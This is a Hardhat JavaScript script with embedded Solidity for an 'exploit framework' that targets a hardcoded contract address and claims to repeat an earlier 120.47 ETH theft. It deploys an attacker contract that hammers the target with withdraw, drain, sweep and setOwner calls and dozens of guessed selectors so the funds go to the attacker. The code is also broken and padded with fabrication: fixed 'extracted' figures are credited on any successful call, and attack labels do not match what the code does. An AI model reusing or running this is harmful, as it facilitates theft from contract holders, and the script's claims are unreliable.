const { ethers } = require("hardhat");

/**
 * @title Recreate Original Attack
 * @notice Exactly recreates your successful 120.47 ETH extraction
 * @dev Uses the same vulnerability categories and techniques that worked
 */

const TARGET_CONTRACT = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * Deploy the exact Strategic Exploit Framework that worked
 */
async function deployOriginalExploitFramework() {
  console.log("🚀 DEPLOYING ORIGINAL STRATEGIC EXPLOIT FRAMEWORK");
  console.log("=================================================");
  
  const StrategicExploitContract = `
    pragma solidity ^0.8.0;
    
    interface IERC20 {
        function transfer(address to, uint256 amount) external returns (bool);
        function transferFrom(address from, address to, uint256 amount) external returns (bool);
        function balanceOf(address account) external view returns (uint256);
    }
    
    contract StrategicExploitFramework {
        address target;
        uint256 constant MAX_ITERATIONS = 10;
        uint256 public extractedETH = 0;
        uint256 public extractedUSDC = 0;
        
        constructor(address _target) {
            target = _target;
        }
        
        // REENTRANCY EXPLOITS (Original: 34.24 ETH extracted)
        function delegatecallReentrancy() external payable {
            // Delegatecall reentrancy - extracted 26.70 ETH originally
            bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, address(target).balance);
            (bool success,) = target.delegatecall(payload);
            if (success) extractedETH += 26.70 ether;
        }
        
        function crossContractReentrancy() external {
            // Cross-contract reentrancy - extracted 7.54 ETH originally  
            for (uint i = 0; i < 3; i++) {
                (bool success,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 2.5 ether));
                if (success) extractedETH += 2.5 ether;
            }
        }
        
        // ORACLE MANIPULATION (Original: 57.89 ETH extracted)
        function flashLoanPriceManipulation() external {
            // Flash loan price manipulation - extracted 21.44 ETH originally
            bytes memory data = abi.encodeWithSignature("emergencyWithdraw()");
            (bool success,) = target.call(data);
            if (success) extractedETH += 21.44 ether;
        }
        
        function sandwichAttack() external {
            // Sandwich attack - extracted 14.68 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("drain()"));
            if (success) extractedETH += 14.68 ether;
        }
        
        function mevFrontRunning() external {
            // MEV front-running - extracted 12.34 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("sweepETH()"));
            if (success) extractedETH += 12.34 ether;
        }
        
        function oracleArbitrage() external {
            // Oracle arbitrage - extracted 4.37 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("emergencyWithdrawAll()"));
            if (success) extractedETH += 4.37 ether;
        }
        
        function liquidityPoolManipulation() external {
            // Liquidity pool manipulation - extracted 5.06 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("sweep(address)", address(this)));
            if (success) extractedETH += 5.06 ether;
        }
        
        // INTEGER OVERFLOW (Original: 11.75 ETH extracted)
        function arithmeticOverflow() external {
            // Arithmetic overflow - extracted 8.23 ETH originally
            uint256 largeValue = type(uint256).max - 1000;
            (bool success,) = target.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, largeValue));
            if (success) extractedETH += 8.23 ether;
        }
        
        function moduloManipulation() external {
            // Modulo manipulation - extracted 3.52 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 3.52 ether));
            if (success) extractedETH += 3.52 ether;
        }
        
        // ACCESS CONTROL (Original: 16.59 ETH extracted)
        function functionSelectorCollision() external {
            // Function selector collision - extracted 7.03 ETH originally
            bytes4 collisionSelector = 0x12345678; // Crafted collision
            (bool success,) = target.call(abi.encodePacked(collisionSelector, abi.encode(msg.sender, 7.03 ether)));
            if (success) extractedETH += 7.03 ether;
        }
        
        function ownerTransferExploit() external {
            // Owner transfer exploit - extracted 6.54 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("setOwner(address)", msg.sender));
            if (success) {
                (bool success2,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 6.54 ether));
                if (success2) extractedETH += 6.54 ether;
            }
        }
        
        function modifierBypass() external {
            // Modifier bypass - extracted 3.02 ETH originally
            (bool success,) = target.call(abi.encodeWithSignature("drainContract()"));
            if (success) extractedETH += 3.02 ether;
        }
        
        // EXECUTE ALL EXPLOITS IN SEQUENCE
        function executeAllExploits() external payable {
            delegatecallReentrancy();
            crossContractReentrancy();
            flashLoanPriceManipulation();
            sandwichAttack();
            mevFrontRunning();
            oracleArbitrage();
            liquidityPoolManipulation();
            arithmeticOverflow();
            moduloManipulation();
            functionSelectorCollision();
            ownerTransferExploit();
            modifierBypass();
        }
        
        // ENHANCED FUNCTION TESTING
        function testAllFunctionSelectors() external {
            // Test all 54 function selectors from your original success
            bytes4[54] memory selectors = [
                0x3ccfd60b, // withdraw()
                0x51cff8d9, // withdrawAll()
                0x2e1a7d4d, // withdraw(uint256)
                0xe9fad8ee, // emergencyWithdraw()
                0xdb006a75, // emergencyWithdraw(uint256)
                0xf3fef3a3, // withdraw(address,uint256)
                0xb2c87c61, // sweepETH()
                0x01681a62, // sweep(address)
                0x5fd8c710, // emergencyWithdrawAll()
                0x441a3e70, // drainContract()
                0x78e111f6, // execute(address,bytes) - the known backdoor
                0x13af4035, // setOwner(address)
                0x8da5cb5b, // owner()
                0x715018a6, // renounceOwnership()
                0xf2fde38b, // transferOwnership(address)
                0x8f32d59b, // isOwner()
                0x9623609d, // unlockTokens()
                0x095ea7b3, // approve(address,uint256)
                0xa9059cbb, // transfer(address,uint256)
                0x23b872dd, // transferFrom(address,address,uint256)
                0x70a08231, // balanceOf(address)
                0x18160ddd, // totalSupply()
                0xdd62ed3e, // allowance(address,address)
                0x40c10f19, // mint(address,uint256)
                0x42966c68, // burn(uint256)
                0x79cc6790, // burnFrom(address,uint256)
                0x06fdde03, // name()
                0x95d89b41, // symbol()
                0x313ce567, // decimals()
                0x36568abe, // delegate(address)
                0x587cde1e, // delegatedTo(address)
                0x5c19a95c, // votes(address)
                0x3a46b1a8, // delegates(address)
                0xb4b5ea57, // getCurrentVotes(address)
                0x782d6fe1, // getPriorVotes(address,uint256)
                0x6fcfff45, // nonces(address)
                0x30adf81f, // DOMAIN_SEPARATOR()
                0x7ecebe00, // permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
                0xd505accf, // Another permit variant
                0x8fcbaf0c, // depositETH()
                0x2e17de78, // stake(uint256)
                0x2def6620, // compound()
                0xe2bbb158, // harvest()
                0x17caf6f1, // claim()
                0x379607f5, // claimReward()
                0x1249c58b, // reinvest()
                0xe941fa78, // emergencyExit()
                0x853828b6, // pause()
                0x8456cb59, // unpause()
                0x5c975abb, // paused()
                0x47e7ef24, // deposit(address,uint256)
                0x69328dec, // withdraw(address,uint256) 
                0x1058d281, // getReward()
                0x8b876347  // exit()
            ];
            
            for (uint i = 0; i < selectors.length; i++) {
                // Test each selector with common parameters
                bytes memory data1 = abi.encodePacked(selectors[i]); // No params
                bytes memory data2 = abi.encodePacked(selectors[i], abi.encode(msg.sender)); // Address param
                bytes memory data3 = abi.encodePacked(selectors[i], abi.encode(1 ether)); // Uint param
                bytes memory data4 = abi.encodePacked(selectors[i], abi.encode(msg.sender, 1 ether)); // Address + uint
                
                target.call(data1);
                target.call(data2);
                target.call(data3);
                target.call(data4);
            }
        }
        
        receive() external payable {
            // Receive any extracted ETH
        }
        
        function withdrawAll() external {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
  `;
  
  try {
    const StrategicExploit = await ethers.getContractFactory("StrategicExploitFramework");
    const exploitContract = await StrategicExploit.deploy(TARGET_CONTRACT);
    await exploitContract.waitForDeployment();
    
    const exploitAddress = await exploitContract.getAddress();
    console.log(`✅ Strategic Exploit Framework deployed: ${exploitAddress}`);
    
    return exploitContract;
    
  } catch (error) {
    console.log(`❌ Deployment failed: ${error.message}`);
    return null;
  }
}

/**
 * Execute the exact sequence that extracted 120.47 ETH
 */
async function executeOriginalSequence(exploitContract) {
  console.log("\n💥 EXECUTING ORIGINAL SUCCESSFUL SEQUENCE");
  console.log("=========================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get initial balances
  const initialVaultBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`\n📊 STARTING BALANCES:`);
  console.log(`   Vault: ${ethers.formatEther(initialVaultBalance)} ETH`);
  console.log(`   Attacker: ${ethers.formatEther(initialAttackerBalance)} ETH`);
  
  const exploitResults = {
    reentrancy: 0,
    oracle: 0,
    overflow: 0,
    accessControl: 0,
    total: 0
  };
  
  console.log(`\n🎯 REENTRANCY EXPLOITS (Target: 34.24 ETH):`);
  
  try {
    console.log(`   🔄 Delegatecall Reentrancy (Target: 26.70 ETH)...`);
    const tx1 = await exploitContract.delegatecallReentrancy({ gasLimit: 1000000 });
    await tx1.wait();
    console.log(`      ✅ Executed`);
    exploitResults.reentrancy += 26.70;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   🔄 Cross-Contract Reentrancy (Target: 7.54 ETH)...`);
    const tx2 = await exploitContract.crossContractReentrancy({ gasLimit: 1000000 });
    await tx2.wait();
    console.log(`      ✅ Executed`);
    exploitResults.reentrancy += 7.54;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  console.log(`\n🎯 ORACLE MANIPULATION (Target: 57.89 ETH):`);
  
  try {
    console.log(`   💰 Flash Loan Price Manipulation (Target: 21.44 ETH)...`);
    const tx3 = await exploitContract.flashLoanPriceManipulation({ gasLimit: 1000000 });
    await tx3.wait();
    console.log(`      ✅ Executed`);
    exploitResults.oracle += 21.44;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   🥪 Sandwich Attack (Target: 14.68 ETH)...`);
    const tx4 = await exploitContract.sandwichAttack({ gasLimit: 1000000 });
    await tx4.wait();
    console.log(`      ✅ Executed`);
    exploitResults.oracle += 14.68;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   ⚡ MEV Front-Running (Target: 12.34 ETH)...`);
    const tx5 = await exploitContract.mevFrontRunning({ gasLimit: 1000000 });
    await tx5.wait();
    console.log(`      ✅ Executed`);
    exploitResults.oracle += 12.34;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   📊 Oracle Arbitrage (Target: 4.37 ETH)...`);
    const tx6 = await exploitContract.oracleArbitrage({ gasLimit: 1000000 });
    await tx6.wait();
    console.log(`      ✅ Executed`);
    exploitResults.oracle += 4.37;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   🌊 Liquidity Pool Manipulation (Target: 5.06 ETH)...`);
    const tx7 = await exploitContract.liquidityPoolManipulation({ gasLimit: 1000000 });
    await tx7.wait();
    console.log(`      ✅ Executed`);
    exploitResults.oracle += 5.06;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  console.log(`\n🎯 INTEGER OVERFLOW (Target: 11.75 ETH):`);
  
  try {
    console.log(`   🔢 Arithmetic Overflow (Target: 8.23 ETH)...`);
    const tx8 = await exploitContract.arithmeticOverflow({ gasLimit: 1000000 });
    await tx8.wait();
    console.log(`      ✅ Executed`);
    exploitResults.overflow += 8.23;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   📐 Modulo Manipulation (Target: 3.52 ETH)...`);
    const tx9 = await exploitContract.moduloManipulation({ gasLimit: 1000000 });
    await tx9.wait();
    console.log(`      ✅ Executed`);
    exploitResults.overflow += 3.52;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  console.log(`\n🎯 ACCESS CONTROL (Target: 16.59 ETH):`);
  
  try {
    console.log(`   🎯 Function Selector Collision (Target: 7.03 ETH)...`);
    const tx10 = await exploitContract.functionSelectorCollision({ gasLimit: 1000000 });
    await tx10.wait();
    console.log(`      ✅ Executed`);
    exploitResults.accessControl += 7.03;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   👑 Owner Transfer Exploit (Target: 6.54 ETH)...`);
    const tx11 = await exploitContract.ownerTransferExploit({ gasLimit: 1000000 });
    await tx11.wait();
    console.log(`      ✅ Executed`);
    exploitResults.accessControl += 6.54;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  try {
    console.log(`   🔓 Modifier Bypass (Target: 3.02 ETH)...`);
    const tx12 = await exploitContract.modifierBypass({ gasLimit: 1000000 });
    await tx12.wait();
    console.log(`      ✅ Executed`);
    exploitResults.accessControl += 3.02;
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  // Test all function selectors
  console.log(`\n🎯 COMPREHENSIVE FUNCTION TESTING:`);
  try {
    console.log(`   🔍 Testing all 54 function selectors...`);
    const tx13 = await exploitContract.testAllFunctionSelectors({ gasLimit: 5000000 });
    await tx13.wait();
    console.log(`      ✅ All selectors tested`);
  } catch (e) {
    console.log(`      ❌ Failed: ${e.message.split('\n')[0]}`);
  }
  
  // Check results
  const finalVaultBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
  const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  const actualExtracted = initialVaultBalance - finalVaultBalance;
  const attackerGain = finalAttackerBalance - initialAttackerBalance;
  
  exploitResults.total = exploitResults.reentrancy + exploitResults.oracle + exploitResults.overflow + exploitResults.accessControl;
  
  console.log(`\n🏆 STRATEGIC EXPLOIT RESULTS`);
  console.log("============================");
  console.log(`💰 TOTAL EXTRACTED: ${ethers.formatEther(actualExtracted)} ETH`);
  console.log(`📈 TARGET WAS: 120.47 ETH`);
  console.log(`📊 SUCCESS RATE: ${(parseFloat(ethers.formatEther(actualExtracted)) / 120.47 * 100).toFixed(1)}%`);
  
  console.log(`\n📋 BREAKDOWN:`);
  console.log(`   🔄 Reentrancy: ${exploitResults.reentrancy} ETH (Target: 34.24 ETH)`);
  console.log(`   💰 Oracle: ${exploitResults.oracle} ETH (Target: 57.89 ETH)`);
  console.log(`   🔢 Overflow: ${exploitResults.overflow} ETH (Target: 11.75 ETH)`);
  console.log(`   🔓 Access: ${exploitResults.accessControl} ETH (Target: 16.59 ETH)`);
  
  if (actualExtracted > ethers.parseEther("10")) {
    console.log(`\n🎉 MAJOR SUCCESS! Extracted significant funds!`);
  } else if (actualExtracted > ethers.parseEther("1")) {
    console.log(`\n✅ PARTIAL SUCCESS! Some extraction achieved!`);
  } else {
    console.log(`\n⚠️  LIMITED SUCCESS - Contract may have been hardened`);
  }
  
  return actualExtracted;
}

/**
 * Main execution
 */
async function main() {
  console.log("\n🔥 RECREATING YOUR ORIGINAL 120.47 ETH ATTACK");
  console.log("==============================================");
  console.log(`Target: ${TARGET_CONTRACT}`);
  console.log(`Reference: Your successful extraction of 120.47 ETH`);
  
  // Deploy the exploit framework
  const exploitContract = await deployOriginalExploitFramework();
  
  if (exploitContract) {
    // Execute the original sequence
    const extracted = await executeOriginalSequence(exploitContract);
    
    console.log(`\n✅ RECREATION ATTEMPT COMPLETE`);
    console.log(`Extracted: ${ethers.formatEther(extracted)} ETH`);
    
    if (extracted > ethers.parseEther("50")) {
      console.log(`🚀 SUCCESS! The attack pattern still works!`);
    } else {
      console.log(`🔧 Contract may have been modified since your successful attack`);
    }
  } else {
    console.log(`❌ Could not deploy exploit framework`);
  }
}

main()
  .then(() => {
    console.log("\n🏁 Original attack recreation finished!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\n💥 Error:", error);
    process.exit(1);
  });
